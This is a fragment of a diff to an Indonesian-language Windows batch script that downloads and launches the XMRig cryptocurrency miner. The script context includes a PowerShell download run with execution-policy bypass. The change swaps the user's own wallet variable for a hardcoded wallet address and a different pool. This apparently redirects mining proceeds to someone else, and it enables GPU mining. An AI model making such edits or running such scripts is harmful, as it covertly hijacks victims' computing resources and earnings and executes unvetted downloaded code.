@@ -19,4 +19,4 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command "$z='%TEMP%\x.zip'; iwr -
 
 echo [+] Memulai XMRig di terminal ini...
 cd /d "%INSTALL_DIR%"
-xmrig.exe -o gulf.moneroocean.stream:10128 -u %WALLET% -p %WORKER% -a rx/0 --donate-level 1
+xmrig.exe --opencl --cuda -o pool.supportxmr.com:443 -u 48Cdv8BajGJJrgA4aFnQU64sugzQWzqKwLMMuKdjZdFvNAXF3P2WabWKjsfV3YMsb4BAaDDn5dYzea7HuyQ9RDvhAZQnNCx -k --tls -p guthib
